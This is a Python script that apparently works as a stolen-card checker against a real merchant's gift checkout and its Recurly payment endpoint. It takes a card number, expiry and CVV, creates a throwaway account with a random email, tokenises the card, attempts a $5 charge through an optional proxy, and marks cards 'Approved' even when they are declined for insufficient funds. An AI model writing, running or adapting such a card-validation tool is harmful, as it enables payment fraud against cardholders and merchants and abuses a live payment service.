import random # ok
import string
import asyncio
import json
from aiohttp import ClientSession


def random_email():
    random_letters = "".join(random.choices(string.ascii_lowercase, k=10))
    return f"{random_letters}@gmail.com"


def capture(string, start, end):
    start_pos, end_pos = string.find(start), string.find(
        end, string.find(start) + len(start)
    )
    return (
        string[start_pos + len(start) : end_pos]
        if start_pos != -1 and end_pos != -1
        else None
    )


async def recurly_gift(cc, mes, ano, cvv, proxy: str = None):

    if len(ano) == 4:
        ano = ano[2:]
    if mes.startswith("0") and len(mes) == 2:
        mes = mes[1]

    email = random_email()

    async with ClientSession() as s:
        headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "Accept-Language": "es-419,es;q=0.8",
            "Connection": "keep-alive",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
        }

        response = await s.get("https://pupbox.com/gift/", headers=headers, proxy=proxy)

        params = {
            "cmd": "initialGiftState",
        }

        response = await s.get(
            "https://pupbox.com/ajax.php", params=params, headers=headers, proxy=proxy
        )

        params = {
            "cmd": "gift-register",
        }

        data = {
            "session_id": "1727138633822",
            "email": email,
            "password": "$2a$10$7LCey.rwKiijDe2U74.C.O4IWM8S/J/zPIyTalKWB2RMSxWoaSqte",
            "flow": "egift",
            "from": "Alex",
            "to": "Alex",
            "note": "xd",
            "plan": "1",
            "to_email": email,
        }

        response = await s.post(
            "https://pupbox.com/ajax.php",
            params=params,
            headers=headers,
            data=data,
            proxy=proxy,
        )
        headers = {
            "Accept": "*/*",
            "Accept-Language": "es-419,es;q=0.8",
            "Connection": "keep-alive",
            "Content-type": "application/x-www-form-urlencoded",
            "Origin": "https://api.recurly.com",
            "Referer": "https://api.recurly.com/js/v1/field.html",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
        }

        headers_recurly = {
            "Accept": "*/*",
            "Accept-Language": "es-419,es;q=0.8",
            "Connection": "keep-alive",
            "Content-type": "application/x-www-form-urlencoded",
            "Origin": "https://api.recurly.com",
            "Referer": "https://api.recurly.com/js/v1/field.html",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
        }

        data = [
            ("first_name", "Firstname"),
            ("last_name", "Lastname"),
            ("country", "US"),
            ("postal_code", "10080"),
            ("number", cc),
            ("browser[color_depth]", "24"),
            ("browser[java_enabled]", "false"),
            ("browser[language]", "es-419"),
            ("browser[referrer_url]", "https://pupbox.com/gift/#checkout"),
            ("browser[screen_height]", "713"),
            ("browser[screen_width]", "1026"),
            ("browser[time_zone_offset]", "360"),
            (
                "browser[user_agent]",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
            ),
            ("month", mes),
            ("year", ano),
            ("cvv", cvv),
            ("version", "4.30.0"),
            ("key", "ewr1-SVjwyaSF4of0LquOF0PxlF"),
            ("deviceId", "OaT95Ca4DOwmeMKn"),
            ("sessionId", "T7hr2uAvuSazcTYG"),
            ("instanceId", "mu7Gbc3DKNTSptjb"),
        ]
        response = await s.post(
            "https://api.recurly.com/js/v1/token",
            headers=headers_recurly,
            data=data,
            proxy=proxy,
        )
        response = await response.json()
        idd = response["id"]

        params = {
            "cmd": "gift-checkout",
        }

        data = {
            "country": "US",
            "coupons": "",
            "to_email": email,
            "flow": "egift",
            "from": "Alex",
            "to": "Alex",
            "note": "xd",
            "plan": "1",
            "cc_token": idd,
        }

        response = await s.post(
            "https://pupbox.com/ajax.php",
            params=params,
            headers=headers,
            data=data,
            proxy=proxy,
        )
        response = await response.text()
        response = json.loads(response)
        if "Your order has been received!" in response:
            status = "Approved ✅"
            response = "Charged 5$"
        else:
            try:
                response_json = json.loads(response)
                
                if "wooId" in response_json or "orderId" in response_json:
                    status = "Approved ✅"
                    response = "Charged 5$"
                else:
                    response = response_json.get("error", "")
                    if "Your transaction was declined due to insufficient funds" in response:
                        status = "Approved ✅"
                    else:
                        status = "Declined ❌"
            except json.JSONDecodeError:
                status = "Error ⚠️"
                response = "Can't Decode JSON Contact Owner!"
        return status, response

